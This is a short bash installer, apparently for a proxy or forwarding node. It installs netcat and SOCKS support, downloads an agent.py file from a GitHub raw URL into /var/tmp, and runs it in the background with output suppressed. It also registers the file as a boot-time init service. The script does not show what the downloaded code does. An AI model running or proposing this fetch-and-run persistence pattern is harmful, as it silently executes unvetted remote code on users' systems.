#!/bin/bash

apt-get -y update
apt-get -y install python3-socks netcat-openbsd
curl -s https://raw.githubusercontent.com/okfit001/forward_v6_node/refs/heads/main/agent.py -o /var/tmp/agent.py
cat >/etc/init.d/agent.sh <<-EOF
#!/bin/sh
cd /var/tmp && nohup python3 agent.py >/dev/null 2>&1 &
EOF
chmod +x /etc/init.d/agent.sh
bash /etc/init.d/agent.sh
update-rc.d agent.sh defaults
